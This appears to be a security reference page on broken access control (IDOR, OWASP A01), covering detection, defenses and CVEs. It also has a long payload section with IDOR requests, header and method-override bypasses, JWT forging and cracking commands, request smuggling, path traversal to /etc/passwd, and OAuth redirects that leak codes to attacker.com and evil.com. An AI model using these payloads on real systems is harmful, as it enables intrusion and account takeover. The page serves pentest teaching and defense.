# Access Control Vulnerabilities

> Missing authorization checks let users reach data or actions they shouldn't. **Deep dive:** [`Troubleshooting_Guide/access_control.md`](../../../../Troubleshooting_Guide/access_control.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** IDOR / BAC · A01:2021
**Status:** complete

## What it is
Broken access control means the application fails to enforce what an authenticated (or
anonymous) user is allowed to see or do, so they reach data or actions outside their privileges.
It covers horizontal escalation (another user's data, e.g. IDOR) and vertical escalation
(reaching admin functionality), and it is OWASP's top web risk.

## How it works
The user controls the request — object IDs, URLs, HTTP methods, headers, role fields, and the
order of multi-step flows — and the server enforces authorization weakly or in the wrong place.
Common failures: trusting a client-supplied role (`Admin=true` cookie, `roleid`), enforcing
access only in the UI or by URL at a front-end gateway (bypassable with `X-Original-URL` or
method overrides), checking permission on one transport but not another (GraphQL, WebSocket),
or referencing objects by an ID without verifying ownership. The root cause is missing or
misplaced server-side authorization on the actual resource.

## Impact
Unauthorized read or modification of other users' data, escalation to administrative
functions, account takeover, and destructive actions (deleting users, changing roles). It is
typically high to critical severity; at scale, IDOR over sequential IDs can dump every record in
the system.

## How to detect
- Changing an object identifier (`?id=`, a GUID, a filename) returns another user's data.
- Admin URLs found in `robots.txt` or JS source are reachable without admin rights.
- A blocked action succeeds when the method changes (`GET`/`PUT`/`PATCH`) or with
  `X-Original-URL`/`X-HTTP-Method-Override` headers.
- A privileged value (`role`, `isAdmin`) submitted in a request body is accepted.
- The same operation that is blocked over REST succeeds via GraphQL or WebSocket.
- Sensitive data appears in a response body that precedes a redirect, or in a pre-filled field.

## Exploitation (summary)
Discover hidden admin functionality, then test whether it is actually protected. Swap object
identifiers to read or modify other users' resources (IDOR), forge client-side role state, and
bypass URL/method-based gateways with override headers. Skip protected steps in multi-stage
flows, tamper with JWT role claims, and pivot to alternate transports (GraphQL/WebSocket) that
miss the check. Full payloads are in the Payloads section below.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Technique selection by control type

| Situation | Technique |
|-----------|-----------|
| Admin URL hidden, not protected | Discover via `robots.txt` / JS source |
| Role from cookie or profile field | Forge cookie / mass-assign role |
| Object referenced by ID in request | IDOR — swap the identifier |
| Front-end gateway enforces auth by URL | `X-Original-URL` / `X-Rewrite-URL` injection |
| POST to admin action blocked | Method override (GET/PUT/PATCH, override headers) |
| Multi-step admin flow | Skip the protected step |
| Auth decided by `Referer` | Forge the Referer header |
| Token-based role | JWT tampering / alg confusion |
| Concurrent role grants | Race condition |

### Discovering unprotected admin functionality
Hidden but unprotected admin URLs surface in disallow rules or client-side code.

```http
GET /robots.txt          # e.g. Disallow: /administrator-panel
GET /administrator-panel
GET /admin-f8h2k9        # unpredictable URL leaked in JS source
```

Enumerate admin endpoints even when undocumented:

```http
GET /api/admin/users
GET /api/admin/config
GET /api/v1/admin
GET /admin-api/users
OPTIONS /api/admin       # inspect Allow: GET, PUT, DELETE
```

### Forgeable role / privilege state
When the role lives in a client-controllable field, set it directly.

```http
Cookie: Admin=true
GET /admin
```

```json
POST /api/user/update
{"email": "test@test.com", "roleid": 2}
```

### IDOR — direct object reference tampering
Replace the identifier with another user's. GUIDs are often leaked in public content (author links, etc.).

```http
GET /my-account?id=carlos
GET /my-account?id=administrator
GET /user?id=a1b2c3d4-e5f6-7890-abcd-ef1234567890
GET /download-transcript/1.txt        # sequential file IDOR
GET /download-transcript/2.txt
```

ID-format and extension variation can dodge naive checks:

```http
GET /order?id=123
GET /order?id=ORD-123
GET /order?id=0x7b
GET /user/123.json
GET /user/123.xml
```

Sensitive data can also leak in a response body that precedes a redirect, or as a pre-filled password field:

```http
GET /my-account?id=carlos          # read body before the 302 — may contain {"apikey": "..."}
GET /my-account?id=administrator   # view source: <input type="password" value="admin123">
```

### URL- and method-based access control bypass
Front-end gateways that authorize by path or HTTP verb can be tricked.

```http
GET / HTTP/1.1
X-Original-URL: /admin/delete?username=carlos
```
```http
GET / HTTP/1.1
X-Rewrite-URL: /admin/delete?username=carlos
```

If the dangerous method is blocked, try alternatives or override headers:

```http
GET /admin/upgrade?username=wiener
PUT /admin/upgrade?username=wiener
PATCH /admin/upgrade?username=wiener
```
```http
POST /admin/delete-user HTTP/1.1
X-HTTP-Method: DELETE
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
```

### Multi-step process & Referer-based checks
Skip directly to an unprotected confirmation step, or forge the `Referer` the server trusts.

```http
POST /admin/upgrade-user-confirm
{"username": "wiener", "confirmed": true}
```
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Referer: https://vulnerable.com/admin
Cookie: session=wiener_session
```

### JWT-based privilege escalation
Tamper with role claims, then exploit weak verification (`alg:none`, RS256→HS256 confusion, or weak secret).

```json
{"user_id": 123, "role": "admin"}
```

```python
import jwt
jwt.decode(token, options={"verify_signature": False})
new_token = jwt.encode({"user_id": "admin", "role": "admin"},
                       open("public.pem").read(), algorithm="HS256")  # RS256 -> HS256
```

```bash
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt   # weak secret
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

### Parameter pollution & CORS abuse (horizontal escalation)
Duplicate identifiers may resolve to the victim depending on the stack; permissive CORS enables cross-origin writes.

```http
POST /api/get_user_details
Content-Type: application/x-www-form-urlencoded

user_id=attacker&user_id=victim
# or: user_id[0]=attacker&user_id[1]=victim
```
```http
PUT /api/user HTTP/1.1
Origin: https://attacker.com
X-HTTP-Method-Override: DELETE
```

### GraphQL & WebSocket authorization bypass
Alternate transports often skip the REST-layer authorization checks.

```graphql
query { user(id: "carlos") { apiKey password ssn } }
query { __schema { types { name fields { name type { name kind } } } } }
query { users { posts { author { password } } } }
```

```javascript
const ws = new WebSocket('wss://target/admin-ws');
ws.send(JSON.stringify({action: 'delete_user', username: 'carlos'}));
```

### Path traversal in authorization
File-path parameters that aren't scoped to the user permit reading restricted resources.

```http
GET /api/files?path=../../admin/config.yml
GET /api/files?path=../../etc/passwd
```

### Race conditions (TOCTOU)
Fire concurrent requests to win the gap between an authorization check and its use.

```bash
for i in {1..100}; do
  curl -X POST https://target/api/upgrade-role -d "username=carlos" &
done
wait
```

### Request smuggling to reach the admin panel
An H2.CL desync can prepend an admin request that bypasses the front-end control.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 58
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X: 
```

### Unicode normalization in role values
Null bytes or homoglyphs can slip a privileged value past a denylist that normalizes later.

```json
POST /api/user/update
{"role": "\x00admin"}
{"role": "Аdmin"}        # Cyrillic 'А' instead of Latin 'A'
```

### Secondary-channel IDOR (account recovery)
Predictable reset tokens or attacker-set recovery emails enable takeover off the main flow.

```http
POST /reset-password
{"token": "predictable_token", "new_password": "hacked123"}
```
```http
PUT /api/user/profile
{"email": "attacker@evil.com"}        # then trigger a reset to the new address
```

### OAuth / SSRF token leakage
Redirect-URI manipulation and open redirects in the callback exfiltrate authorization codes.

```http
GET /auth?redirect_uri=https://attacker.com/callback&client_id=app&response_type=code
GET /callback?code=xxx&redirect=https://evil.com
```

## Defenses
1. **Deny by default** — every resource and action requires an explicit allow; new endpoints are
   inaccessible until permission is granted.
2. **Enforce server-side, on the resource** — check authorization in the backend for every
   request, not in the UI or at a URL gateway; verify object *ownership*, not just authentication.
3. **Never trust client-supplied role/identity** — derive role and user from the server session,
   ignore `role`/`isAdmin`/`roleid` in requests, and use unguessable, ownership-scoped object
   references.
4. **Apply checks across all transports and methods** — REST, GraphQL, WebSocket, and every HTTP
   verb must share one authorization layer; ignore `X-Original-URL`/method-override headers.
5. **Centralize and test** — use a single, well-tested access-control mechanism rather than
   per-handler checks; add automated tests for horizontal and vertical escalation.
6. **Log and rate-limit** access-control failures to detect enumeration and IDOR sweeps.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Access+Control+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Access+Control+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=Access+Control+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=Access+Control+Vulnerabilities
- **OSV** — https://osv.dev/list?q=Access+Control+Vulnerabilities
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Access Control Vulnerabilities <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2021-22986` — F5 BIG-IP iControl REST unauthenticated access to admin functionality.
- `CVE-2023-22515` — Atlassian Confluence broken access control enabling admin-account creation.
- `CVE-2019-11510` — Pulse Secure path-traversal/access-control bypass exposing sensitive files.

## References
- PortSwigger Web Security Academy — Access control vulnerabilities.
- OWASP — Authorization Cheat Sheet & Insecure Direct Object Reference Prevention Cheat Sheet.
- OWASP — A01:2021 Broken Access Control.
